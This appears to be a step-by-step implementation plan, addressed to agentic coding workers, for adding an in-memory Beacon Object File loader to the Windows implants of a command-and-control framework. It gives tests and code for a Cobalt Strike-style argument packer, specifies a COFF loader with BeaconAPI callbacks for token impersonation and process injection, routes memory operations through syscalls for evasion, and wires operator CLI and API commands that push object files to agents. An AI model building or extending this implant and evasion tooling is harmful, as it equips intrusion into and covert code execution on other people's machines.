# BOF Loader Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add in-memory Beacon Object File (BOF) execution to Windows agents with full BeaconAPI compatibility.

**Architecture:** Pure Python/ctypes COFF loader as an evasion module (`evasion/bof_loader.py`) following the existing `generate_code(lang, config)` pattern. Memory operations route through `SyscallResolver` when syscalls are enabled. Server-side `BOFPacker` handles argument marshaling. Agent template gets a new `{{EVASION_BOF}}` placeholder.

**Tech Stack:** Python, ctypes, struct

## Global Constraints

- x64 COFF only (`Machine == 0x8664`)
- No RWX pages at any point
- Python/C language support only (no PowerShell/JS/HTA BOF support)
- Must work with or without `--syscalls` flag
- Must be backward-compatible: agents generated without `--bof` are unchanged

---

### Task 1: BOFPacker — Server-Side Argument Marshaling

**Files:**
- Create: `evasion/bof_packer.py`
- Test: `tests/test_bof_packer.py`

**Interfaces:**
- Consumes: nothing (standalone)
- Produces: `BOFPacker` class with `add_int(val: int)`, `add_short(val: int)`, `add_str(val: str)`, `add_wstr(val: str)`, `add_binary(val: bytes)`, `pack() -> bytes`. Also `parse_bof_args(args: list[str]) -> bytes` convenience function that parses CLI-style `type:value` strings.

- [ ] **Step 1: Write failing tests**

```python
# tests/test_bof_packer.py
import struct
import pytest
from evasion.bof_packer import BOFPacker, parse_bof_args


class TestBOFPacker:
    def test_add_int(self):
        p = BOFPacker()
        p.add_int(1234)
        data = p.pack()
        assert data == struct.pack('>I', 1234)

    def test_add_short(self):
        p = BOFPacker()
        p.add_short(42)
        data = p.pack()
        assert data == struct.pack('>H', 42)

    def test_add_str(self):
        p = BOFPacker()
        p.add_str("hello")
        data = p.pack()
        encoded = b"hello\x00"
        expected = struct.pack('>I', len(encoded)) + encoded
        assert data == expected

    def test_add_wstr(self):
        p = BOFPacker()
        p.add_wstr("hi")
        data = p.pack()
        encoded = "hi".encode('utf-16-le') + b'\x00\x00'
        expected = struct.pack('>I', len(encoded)) + encoded
        assert data == expected

    def test_add_binary(self):
        p = BOFPacker()
        p.add_binary(b'\xde\xad\xbe\xef')
        data = p.pack()
        expected = struct.pack('>I', 4) + b'\xde\xad\xbe\xef'
        assert data == expected

    def test_mixed_args(self):
        p = BOFPacker()
        p.add_int(10)
        p.add_str("test")
        data = p.pack()
        encoded_str = b"test\x00"
        expected = struct.pack('>I', 10) + struct.pack('>I', len(encoded_str)) + encoded_str
        assert data == expected

    def test_empty_pack(self):
        p = BOFPacker()
        assert p.pack() == b''

    def test_parse_bof_args_str_default(self):
        data = parse_bof_args(["hello"])
        p = BOFPacker()
        p.add_str("hello")
        assert data == p.pack()

    def test_parse_bof_args_typed(self):
        data = parse_bof_args(["int:42", "str:test", "short:7"])
        p = BOFPacker()
        p.add_int(42)
        p.add_str("test")
        p.add_short(7)
        assert data == p.pack()

    def test_parse_bof_args_wstr(self):
        data = parse_bof_args(["wstr:C:\\Users"])
        p = BOFPacker()
        p.add_wstr("C:\\Users")
        assert data == p.pack()
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `python -m pytest tests/test_bof_packer.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'evasion.bof_packer'`

- [ ] **Step 3: Implement BOFPacker**

```python
# evasion/bof_packer.py
from __future__ import annotations

import struct


class BOFPacker:
    """Pack arguments for BOF execution using Cobalt Strike's wire format."""

    def __init__(self):
        self._buf = bytearray()

    def add_int(self, val: int):
        self._buf += struct.pack('>I', val)

    def add_short(self, val: int):
        self._buf += struct.pack('>H', val)

    def add_str(self, val: str):
        encoded = val.encode('utf-8') + b'\x00'
        self._buf += struct.pack('>I', len(encoded))
        self._buf += encoded

    def add_wstr(self, val: str):
        encoded = val.encode('utf-16-le') + b'\x00\x00'
        self._buf += struct.pack('>I', len(encoded))
        self._buf += encoded

    def add_binary(self, val: bytes):
        self._buf += struct.pack('>I', len(val))
        self._buf += val

    def pack(self) -> bytes:
        return bytes(self._buf)


def parse_bof_args(args: list[str]) -> bytes:
    """Parse CLI-style type:value args into packed binary.

    Supported prefixes: int:, short:, str:, wstr:, bin: (file path).
    No prefix defaults to str:.
    """
    packer = BOFPacker()
    for arg in args:
        if arg.startswith('int:'):
            packer.add_int(int(arg[4:]))
        elif arg.startswith('short:'):
            packer.add_short(int(arg[6:]))
        elif arg.startswith('wstr:'):
            packer.add_wstr(arg[5:])
        elif arg.startswith('bin:'):
            with open(arg[4:], 'rb') as f:
                packer.add_binary(f.read())
        elif arg.startswith('str:'):
            packer.add_str(arg[4:])
        else:
            packer.add_str(arg)
    return packer.pack()
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `python -m pytest tests/test_bof_packer.py -v`
Expected: All 11 tests PASS

- [ ] **Step 5: Commit**

```bash
git add evasion/bof_packer.py tests/test_bof_packer.py
git commit -m "feat: add BOFPacker for server-side argument marshaling"
```

---

### Task 2: COFF Loader Core — Parsing, Loading, Relocations

**Files:**
- Create: `evasion/bof_loader.py`
- Test: `tests/test_bof_loader.py`

**Interfaces:**
- Consumes: nothing directly (syscall wrappers are optional, detected at runtime)
- Produces: `generate_code(lang: str, config: EvasionConfig) -> str` returning Python source code containing:
  - `COFFLoader` class with `load(coff_bytes, args_bytes, entry='go') -> str`
  - All BeaconAPI callback implementations
  - `handle_bof(data: dict) -> str` command handler function

The generated code string is what gets injected into the agent template. This task builds the generator; Tasks 3-4 wire it into the evasion system and agent.

- [ ] **Step 1: Write failing tests for COFF parsing**

```python
# tests/test_bof_loader.py
import struct
import pytest


# Minimal COFF constants
IMAGE_FILE_MACHINE_AMD64 = 0x8664
IMAGE_REL_AMD64_ADDR64 = 0x0001
IMAGE_REL_AMD64_ADDR32NB = 0x0003
IMAGE_REL_AMD64_REL32 = 0x0004


def make_coff_header(num_sections, num_symbols, symtab_offset):
    """Build a minimal 20-byte COFF header."""
    return struct.pack('<HHIIIHH',
        IMAGE_FILE_MACHINE_AMD64,  # Machine
        num_sections,              # NumberOfSections
        0,                         # TimeDateStamp
        symtab_offset,             # PointerToSymbolTable
        num_symbols,               # NumberOfSymbols
        0,                         # SizeOfOptionalHeader
        0,                         # Characteristics
    )


def make_section_header(name, virtual_size, virtual_addr, raw_size, raw_offset,
                        reloc_offset, num_relocs, characteristics):
    """Build a 40-byte section header."""
    padded_name = name.encode('ascii').ljust(8, b'\x00')
    return struct.pack('<8sIIIIIIHHI',
        padded_name,
        virtual_size,
        virtual_addr,
        raw_size,
        raw_offset,
        reloc_offset,   # PointerToRelocations
        0,              # PointerToLinenumbers
        num_relocs,     # NumberOfRelocations
        0,              # NumberOfLinenumbers
        characteristics,
    )


def make_symbol(name, value, section_number, type_val, storage_class):
    """Build an 18-byte COFF symbol table entry."""
    if len(name) <= 8:
        sym_name = name.encode('ascii').ljust(8, b'\x00')
    else:
        sym_name = struct.pack('<II', 0, 4)  # offset into string table at position 4
    return struct.pack('<8sIhHBB',
        sym_name,
        value,
        section_number,
        type_val,
        storage_class,
        0,  # NumberOfAuxSymbols
    )


def make_relocation(virtual_address, symbol_index, reloc_type):
    """Build a 10-byte COFF relocation entry."""
    return struct.pack('<IIH', virtual_address, symbol_index, reloc_type)


class TestCOFFParsing:
    def test_rejects_non_amd64(self):
        """COFF loader must reject non-x64 objects."""
        from evasion.bof_loader import generate_code
        from evasion import EvasionConfig
        code = generate_code('python', EvasionConfig(bof=True))
        assert 'COFFLoader' in code
        assert '0x8664' in code

    def test_generate_code_contains_beacon_api(self):
        from evasion.bof_loader import generate_code
        from evasion import EvasionConfig
        code = generate_code('python', EvasionConfig(bof=True))
        assert 'BeaconPrintf' in code
        assert 'BeaconOutput' in code
        assert 'BeaconDataParse' in code
        assert 'BeaconDataInt' in code
        assert 'BeaconDataExtract' in code
        assert 'BeaconDataLength' in code
        assert 'BeaconFormatAlloc' in code
        assert 'BeaconFormatFree' in code
        assert 'BeaconFormatAppend' in code
        assert 'BeaconFormatPrintf' in code
        assert 'BeaconGetSpawnTo' in code
        assert 'BeaconIsAdmin' in code
        assert 'BeaconUseToken' in code
        assert 'BeaconRevertToken' in code

    def test_generate_code_contains_handler(self):
        from evasion.bof_loader import generate_code
        from evasion import EvasionConfig
        code = generate_code('python', EvasionConfig(bof=True))
        assert 'handle_bof' in code
        assert '__bof__' in code

    def test_generate_code_unsupported_lang(self):
        from evasion.bof_loader import generate_code
        from evasion import EvasionConfig
        code = generate_code('powershell', EvasionConfig(bof=True))
        assert code == ''

    def test_generate_code_has_no_rwx(self):
        """Verify generated code never uses PAGE_EXECUTE_READWRITE."""
        from evasion.bof_loader import generate_code
        from evasion import EvasionConfig
        code = generate_code('python', EvasionConfig(bof=True))
        assert 'PAGE_EXECUTE_READWRITE' not in code
        assert '0x40' not in code  # PAGE_EXECUTE_READWRITE value

    def test_generate_code_syscall_routing(self):
        """When syscalls config is set, generated code should reference syscall wrappers."""
        from evasion.bof_loader import generate_code
        from evasion import EvasionConfig
        code = generate_code('python', EvasionConfig(bof=True, syscalls='indirect'))
        assert 'syscall_alloc' in code
        assert 'syscall_protect' in code

    def test_generate_code_no_syscalls(self):
        """Without syscalls, generated code uses VirtualAlloc/VirtualProtect."""
        from evasion.bof_loader import generate_code
        from evasion import EvasionConfig
        code = generate_code('python', EvasionConfig(bof=True))
        assert 'VirtualAlloc' in code
        assert 'VirtualProtect' in code

    def test_win32_import_resolution_pattern(self):
        """Code must handle __imp_LIBRARY$Function symbol convention."""
        from evasion.bof_loader import generate_code
        from evasion import EvasionConfig
        code = generate_code('python', EvasionConfig(bof=True))
        assert '__imp_' in code
        assert 'LoadLibrary' in code
        assert 'GetProcAddress' in code

    def test_datap_struct(self):
        """Code must define datap struct matching CS layout."""
        from evasion.bof_loader import generate_code
        from evasion import EvasionConfig
        code = generate_code('python', EvasionConfig(bof=True))
        assert 'datap' in code
        assert 'original' in code
        assert 'buffer' in code

    def test_formatp_struct(self):
        """Code must define formatp struct."""
        from evasion.bof_loader import generate_code
        from evasion import EvasionConfig
        code = generate_code('python', EvasionConfig(bof=True))
        assert 'formatp' in code
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `python -m pytest tests/test_bof_loader.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'evasion.bof_loader'`

- [ ] **Step 3: Implement bof_loader.py**

Create `evasion/bof_loader.py` with `generate_code(lang, config)` that returns a Python source string containing:

1. **COFF constants** — `IMAGE_FILE_MACHINE_AMD64 = 0x8664`, relocation types, section characteristics, symbol storage classes

2. **ctypes struct definitions** — `datap` and `formatp` as ctypes Structures with fields: `original` (c_char_p), `buffer` (c_char_p), `length` (c_int), `size` (c_int)

3. **BeaconAPI implementations** — all functions from the spec as Python functions that operate on a shared output buffer (`_beacon_output`):
   - `_beacon_printf(btype, fmt)` — append formatted string to `_beacon_output`
   - `_beacon_output(btype, data, length)` — append raw bytes
   - `_beacon_data_parse(parser, buf, size)` — initialize datap fields
   - `_beacon_data_int(parser)` — read 4 bytes big-endian, advance
   - `_beacon_data_short(parser)` — read 2 bytes big-endian, advance
   - `_beacon_data_length(parser, outlen)` — read length-prefixed blob
   - `_beacon_data_extract(parser, outlen)` — read null-terminated string
   - `_beacon_format_alloc(fmt, maxsz)` — allocate buffer
   - `_beacon_format_reset(fmt)` — reset position
   - `_beacon_format_free(fmt)` — free buffer
   - `_beacon_format_append(fmt, data, length)` — append bytes
   - `_beacon_format_printf(fmt, fmtstr)` — printf into buffer
   - `_beacon_format_tostring(fmt, size)` — return pointer
   - `_beacon_format_int(fmt, val)` — append 4-byte int
   - `_beacon_get_spawnto(x86, buf, length)` — write spawnto path
   - `_beacon_inject_process(...)` — route through injection module if available
   - `_beacon_inject_temp_process(...)` — inject into temp process
   - `_beacon_spawn_temp_process(...)` — spawn sacrificial process
   - `_beacon_use_token(token)` — `ImpersonateLoggedOnUser`
   - `_beacon_revert_token()` — `RevertToSelf`
   - `_beacon_cleanup_process(pi)` — terminate + close
   - `_beacon_is_admin()` — `IsUserAnAdmin`

4. **BEACON_API lookup table** — `dict[str, ctypes callback]` mapping symbol names to callbacks

5. **COFFLoader class**:
   - `__init__(self)`: init `_beacon_output` list
   - `load(self, coff_bytes, args_bytes=b'', entry='go') -> str`:
     - Call `_parse_coff(coff_bytes)` → header, sections, symbols, strings
     - Call `_load_sections(sections)` → base_addr, section_map
     - Call `_resolve_symbols(symbols, strings, section_map)` → resolved addresses
     - Call `_apply_relocations(sections, section_map, resolved, base_addr)`
     - Call `_execute(base_addr, section_map, resolved, entry, args_bytes)` → output
     - Cleanup: zero-fill, free
     - Return collected output
   - `_parse_coff(self, data)`: validate machine type, extract sections/symbols/string table
   - `_load_sections(self, sections)`: single `VirtualAlloc`/`syscall_alloc` (RW), copy section data with 16-byte alignment
   - `_resolve_symbols(self, symbols, strings, section_map)`: resolve BeaconAPI names from lookup table, `__imp_LIBRARY$Function` via `LoadLibraryA`+`GetProcAddress`, section-relative symbols via section_map offsets
   - `_apply_relocations(self, sections, section_map, resolved, base_addr)`: process ADDR64, ADDR32NB, REL32
   - `_execute(self, base_addr, section_map, resolved, entry, args_bytes)`: RW→RX, find go symbol, allocate args buffer, call via CFUNCTYPE, RX→RW, zero-fill, free

6. **Memory functions** — conditional on whether syscall wrappers exist in scope:
   ```python
   try:
       _mem_alloc = syscall_alloc
       _mem_protect = syscall_protect
   except NameError:
       _k32 = ctypes.windll.kernel32
       def _mem_alloc(proc, addr, size, alloc_type, protect):
           return _k32.VirtualAlloc(addr, size, alloc_type, protect)
       def _mem_protect(proc, addr, size, new_protect):
           old = ctypes.c_ulong(0)
           _k32.VirtualProtect(addr, size, new_protect, ctypes.byref(old))
           return old.value
   ```

7. **`handle_bof(data)` function** — command handler called by the agent when `data.get('type') == '__bof__'`:
   ```python
   def handle_bof(data):
       import base64
       loader = COFFLoader()
       coff_bytes = base64.b64decode(data.get('bof_data', ''))
       args_bytes = base64.b64decode(data.get('bof_args', ''))
       entry = data.get('bof_entry', 'go')
       try:
           output = loader.load(coff_bytes, args_bytes, entry)
           return output if output else 'BOF executed successfully (no output)'
       except Exception as e:
           return f'BOF execution failed: {str(e)}'
   ```

The `generate_code` function wraps all the above in a `textwrap.dedent` string. When `config.syscalls` is set, it emits the `syscall_alloc`/`syscall_protect` try-except path; otherwise it emits the direct `VirtualAlloc`/`VirtualProtect` path.

When `lang != 'python'`, return `''`.

- [ ] **Step 4: Run tests to verify they pass**

Run: `python -m pytest tests/test_bof_loader.py -v`
Expected: All 11 tests PASS

- [ ] **Step 5: Commit**

```bash
git add evasion/bof_loader.py tests/test_bof_loader.py
git commit -m "feat: add COFF loader with BeaconAPI and relocation support"
```

---

### Task 3: Evasion System Integration

**Files:**
- Modify: `evasion/__init__.py:8-11` (EvasionConfig), `evasion/__init__.py:20-28` (FEATURE_LANG_SUPPORT), `evasion/__init__.py:30-38` (_PLACEHOLDER_MAP), `evasion/__init__.py:49-89` (get_all_evasion_code)
- Modify: `templates/agent_template.py:20` (add placeholder)

**Interfaces:**
- Consumes: `evasion/bof_loader.generate_code(lang, config)` from Task 2
- Produces: `EvasionConfig.bof: bool` field. `{{EVASION_BOF}}` placeholder resolved in agent template. `get_all_evasion_code()` includes BOF code when `config.bof` is True.

- [ ] **Step 1: Write failing test**

```python
# tests/test_bof_evasion_integration.py
import pytest
from evasion import EvasionConfig, get_all_evasion_code, FEATURE_LANG_SUPPORT, _PLACEHOLDER_MAP


class TestBOFEvasionIntegration:
    def test_evasion_config_has_bof(self):
        config = EvasionConfig(bof=True)
        assert config.bof is True

    def test_evasion_config_bof_default_false(self):
        config = EvasionConfig()
        assert config.bof is False

    def test_feature_lang_support_has_bof(self):
        assert 'bof' in FEATURE_LANG_SUPPORT
        assert 'python' in FEATURE_LANG_SUPPORT['bof']

    def test_placeholder_map_has_bof(self):
        assert 'bof' in _PLACEHOLDER_MAP
        assert _PLACEHOLDER_MAP['bof'] == 'EVASION_BOF'

    def test_get_all_evasion_code_includes_bof(self):
        config = EvasionConfig(bof=True)
        result = get_all_evasion_code('python', config)
        assert 'EVASION_BOF' in result
        assert 'COFFLoader' in result['EVASION_BOF']

    def test_get_all_evasion_code_excludes_bof_when_disabled(self):
        config = EvasionConfig(bof=False)
        result = get_all_evasion_code('python', config)
        assert 'EVASION_BOF' not in result

    def test_bof_not_in_powershell(self):
        config = EvasionConfig(bof=True)
        result = get_all_evasion_code('powershell', config)
        assert 'EVASION_BOF' not in result
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `python -m pytest tests/test_bof_evasion_integration.py -v`
Expected: FAIL — `EvasionConfig` does not have `bof` field

- [ ] **Step 3: Modify evasion/__init__.py**

Add `bof: bool = False` to `EvasionConfig`:

```python
@dataclass
class EvasionConfig:
    amsi: bool = False
    etw: bool = False
    syscalls: Optional[str] = None
    inject: Optional[str] = None
    inject_target: Optional[str] = None
    sleep_obf: Optional[str] = None
    idle_encrypt: int = 30
    profile: str = "default"
    bof: bool = False
```

Add to `FEATURE_LANG_SUPPORT`:
```python
"bof": ("python",),
```

Add to `_PLACEHOLDER_MAP`:
```python
"bof": "EVASION_BOF",
```

Add to `get_all_evasion_code`, after the `sleep_obf` block:
```python
if config.bof:
    code = get_evasion_code("bof_loader", lang, config)
    if code:
        result[_PLACEHOLDER_MAP["bof"]] = code
```

Note: The feature key in `FEATURE_LANG_SUPPORT` and `_PLACEHOLDER_MAP` is `"bof"`, but `get_evasion_code` imports `evasion.bof_loader` — the module name has an underscore. Add a mapping in `get_evasion_code` or adjust the feature key used in the import to `"bof_loader"`. Simplest: use `"bof_loader"` in both maps and reference `config.bof` in the conditional:

```python
FEATURE_LANG_SUPPORT = {
    ...
    "bof_loader": ("python",),
}

_PLACEHOLDER_MAP = {
    ...
    "bof_loader": "EVASION_BOF",
}
```

And in `get_all_evasion_code`:
```python
if config.bof:
    code = get_evasion_code("bof_loader", lang, config)
    if code:
        result[_PLACEHOLDER_MAP["bof_loader"]] = code
```

- [ ] **Step 4: Add {{EVASION_BOF}} placeholder to agent template**

In `templates/agent_template.py`, add after `{{EVASION_INJECT}}` (line 20):

```python
{{EVASION_BOF}}
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `python -m pytest tests/test_bof_evasion_integration.py -v`
Expected: All 7 tests PASS

- [ ] **Step 6: Run existing tests to check for regressions**

Run: `python -m pytest tests/ -v`
Expected: All existing tests still pass

- [ ] **Step 7: Commit**

```bash
git add evasion/__init__.py templates/agent_template.py tests/test_bof_evasion_integration.py
git commit -m "feat: wire BOF loader into evasion system with template placeholder"
```

---

### Task 4: Agent Template BOF Command Handling

**Files:**
- Modify: `templates/agent_template.py:206,275` (add `__bof__` command type handling in both beacon and streaming paths)

**Interfaces:**
- Consumes: `handle_bof(data)` function from Task 2 (injected via `{{EVASION_BOF}}`)
- Produces: Agent handles `{"type": "__bof__", "bof_data": "...", "bof_args": "...", "bof_entry": "go"}` messages

- [ ] **Step 1: Add __bof__ handling to beacon command dispatch**

In `templates/agent_template.py`, in the beacon command loop (around line 206 where `data.get('type') == 'command'`), add a new branch:

```python
                                elif data.get('type') == '__bof__':
                                    pending_commands.append({
                                        'command': '__bof__',
                                        'bof_data': data,
                                        'timestamp': data.get('timestamp', '')
                                    })
```

In the beacon offline execution block (around line 242), modify the command execution to check for BOF:

```python
                            for cmd_data in pending_commands:
                                try:
                                    if cmd_data.get('command') == '__bof__':
                                        try:
                                            output = handle_bof(cmd_data['bof_data'])
                                        except NameError:
                                            output = 'BOF loader not enabled in this agent'
                                    else:
                                        output = execute_command(cmd_data['command'])
```

- [ ] **Step 2: Add __bof__ handling to streaming command dispatch**

In the streaming loop (around line 275 where `data.get('type') == 'command'`), add:

```python
                            elif data.get('type') == '__bof__':
                                try:
                                    output = handle_bof(data)
                                except NameError:
                                    output = 'BOF loader not enabled in this agent'

                                response = {
                                    'type': 'response',
                                    'output': output
                                }
                                encrypted_response = simple_encrypt(json.dumps(response))
                                await websocket.send(encrypted_response)
```

- [ ] **Step 3: Verify template is syntactically valid**

Run: `python -c "open('templates/agent_template.py').read()"`
Expected: No error

- [ ] **Step 4: Commit**

```bash
git add templates/agent_template.py
git commit -m "feat: add BOF command handling to agent template"
```

---

### Task 5: Server-Side BOF Command + CLI Integration

**Files:**
- Modify: `server.py` (add `send_bof_to_agent` method)
- Modify: `main.py` (add `--bof` flag to `do_generate`, add `bof` command to agent interaction loop, add to help)
- Modify: `agent.py` (add `bof` param to `generate_python_agent` and `generate_all`)
- Modify: `gui/api.py` (add BOF request model and endpoint)

**Interfaces:**
- Consumes: `BOFPacker`, `parse_bof_args` from Task 1. `EvasionConfig.bof` from Task 3.
- Produces: `SockPuppetsServer.send_bof_to_agent(agent_id, bof_data, bof_args, entry)` method. `bof` CLI command in agent interaction. `--bof` flag in generate. `/api/agents/{id}/bof` REST endpoint.

- [ ] **Step 1: Add send_bof_to_agent to server.py**

After `send_command_to_agent` method in `server.py`, add:

```python
    async def send_bof_to_agent(self, agent_id: str, bof_data: str, bof_args: str, entry: str = 'go') -> str:
        """Send BOF execution command to agent."""
        if agent_id not in self.agents:
            return "Agent not found"

        agent = self.agents[agent_id]

        msg = {
            'type': '__bof__',
            'bof_data': bof_data,
            'bof_args': bof_args,
            'bof_entry': entry,
        }

        agent.command_history.append({
            'command': f'__bof__ (entry={entry})',
            'queued_at': datetime.now().isoformat()
        })

        await agent.command_queue.put(msg)

        self.events.emit({
            "event": "bof_executed",
            "agent_id": agent_id,
            "entry": entry,
            "operator": "cli",
        })

        if agent.mode == 'beacon':
            return f"[*] BOF queued for beacon (will execute on next checkin in ~{agent.beacon_interval}s)"

        if agent.websocket not in self.active_connections:
            return "Agent is not connected"

        try:
            response = await asyncio.wait_for(agent.response_queue.get(), timeout=60.0)
            return response
        except asyncio.TimeoutError:
            return "BOF execution timeout - no response from agent"
```

- [ ] **Step 2: Add bof command to agent interaction in main.py**

In the agent interaction loop in `main.py` (around line 310, after the `kill` command block), add:

```python
                    if command.lower().startswith('bof '):
                        parts = command.split(None, 1)
                        if len(parts) < 2:
                            print("[-] Usage: bof <path-to-.o> [type:value ...]")
                            continue

                        bof_args_raw = parts[1].split()
                        bof_path = bof_args_raw[0]
                        bof_cli_args = bof_args_raw[1:] if len(bof_args_raw) > 1 else []

                        if not os.path.exists(bof_path):
                            print(f"[-] BOF file not found: {bof_path}")
                            continue

                        try:
                            import base64
                            from evasion.bof_packer import parse_bof_args

                            with open(bof_path, 'rb') as f:
                                bof_data = base64.b64encode(f.read()).decode()
                            bof_args = base64.b64encode(parse_bof_args(bof_cli_args)).decode()

                            print(f"[*] Loading BOF: {os.path.basename(bof_path)}")
                            if bof_cli_args:
                                print(f"[*] Args: {' '.join(bof_cli_args)}")

                            current_agent = self.server.agents.get(agent_id)
                            if current_agent and current_agent.mode == 'beacon':
                                print(f"[*] Waiting for beacon to check in...")
                                timeout = 65
                            else:
                                timeout = 65

                            future = asyncio.run_coroutine_threadsafe(
                                self.server.send_bof_to_agent(agent_id, bof_data, bof_args),
                                self.loop
                            )
                            result = future.result(timeout=timeout)
                            print(result)
                        except Exception as e:
                            print(f"[-] BOF error: {str(e)}")
                        continue
```

- [ ] **Step 3: Add --bof flag to do_generate in main.py**

In the variable declarations (around line 574):
```python
        bof = False
```

In the flag parsing loop, add:
```python
            elif arg == '--bof':
                bof = True
```

In the evasion summary block (around line 783):
```python
            if bof:
                print(f"    - BOF loader")
```

In the `generate_all` call (around line 804), add `bof=bof`:
```python
        results = generator.generate_all(
            ...,
            redirector=redirector,
            bof=bof,
        )
```

In the help text (around line 545), add:
```python
            print("      --bof                  Enable BOF (Beacon Object File) loading")
```

In `do_help` (around line 995), add in the Evasion Options section:
```python
        print("  \033[1m--bof\033[0m                 Enable BOF loader in agent")
```

Also update `--evasion-all` to include `bof = True`:
```python
        if evasion_all:
            ...
            bof = True
```

- [ ] **Step 4: Add bof param to agent.py generate methods**

In `generate_python_agent` signature (line 907), add `bof: bool = False` after `redirector`:
```python
    def generate_python_agent(self, ..., redirector: str = None, bof: bool = False) -> str:
```

In the `EvasionConfig` construction inside `generate_python_agent`, add `bof=bof`.

In `generate_all` signature (line 1778), add `bof: bool = False` after `redirector`:
```python
    def generate_all(self, ..., redirector: str = None, bof: bool = False) -> dict:
```

Pass `bof=bof` through to `generate_python_agent`.

- [ ] **Step 5: Add BOF endpoint to gui/api.py**

Add request model:
```python
class BOFRequest(BaseModel):
    bof_data: str
    args: str = ""
    entry: str = "go"
```

Add endpoint:
```python
@router.post("/agents/{agent_id}/bof")
async def execute_bof(agent_id: str, req: BOFRequest, _=Depends(_auth_dep)):
    if not _server or agent_id not in _server.agents:
        raise HTTPException(404, "Agent not found")
    result = await _server.send_bof_to_agent(agent_id, req.bof_data, req.args, req.entry)
    return {"output": result}
```

Also add `bof: bool = False` to `GenerateRequest` model and pass it through in the generate endpoint.

- [ ] **Step 6: Add bof to agent interaction help text**

In `main.py`, in the agent interaction help section or `do_help`, add:
```
        print("  \033[1mbof <file.o> [args...]\033[0m        Execute BOF on agent")
```

- [ ] **Step 7: Run all tests**

Run: `python -m pytest tests/ -v`
Expected: All tests pass including new BOF tests

- [ ] **Step 8: Commit**

```bash
git add server.py main.py agent.py gui/api.py
git commit -m "feat: add BOF command to server, CLI, agent generator, and GUI API"
```

---

### Task 6: Agent Template Command Queue Fix for BOF Messages

**Files:**
- Modify: `templates/agent_template.py` (update command queue to handle dict messages for BOF)
- Modify: `server.py` (update `handle_agent` to send dict messages from queue)

**Interfaces:**
- Consumes: `send_bof_to_agent` puts a dict on `agent.command_queue` (Task 5)
- Produces: Agent correctly dispatches both string commands and dict BOF messages

The current `handle_agent` in `server.py` sends commands as `{'type': 'command', 'command': <string>}`. For BOF, we need to send the dict directly. This task ensures the server's command dispatch and the agent's receive logic both handle the dual format.

- [ ] **Step 1: Update server handle_agent to support dict commands**

In `server.py`, in the `handle_agent` method where commands are dequeued and sent to agents, add a check:

```python
# When dequeuing from command_queue:
cmd = await agent.command_queue.get()
if isinstance(cmd, dict):
    # BOF or structured command — send as-is
    msg = cmd
else:
    # Regular string command
    msg = {'type': 'command', 'command': cmd}
```

Find the exact location in `server.py` where `command_queue.get()` is called and the result is wrapped in `{'type': 'command', ...}` — apply this conditional there.

- [ ] **Step 2: Verify agent template handles both message types**

The agent template already has `data.get('type') == 'command'` and (after Task 4) `data.get('type') == '__bof__'`. No further changes needed on the agent side since the server now sends the correct type field.

- [ ] **Step 3: Run full test suite**

Run: `python -m pytest tests/ -v`
Expected: All tests pass

- [ ] **Step 4: Commit**

```bash
git add server.py
git commit -m "feat: support dict-typed messages in command queue for BOF dispatch"
```
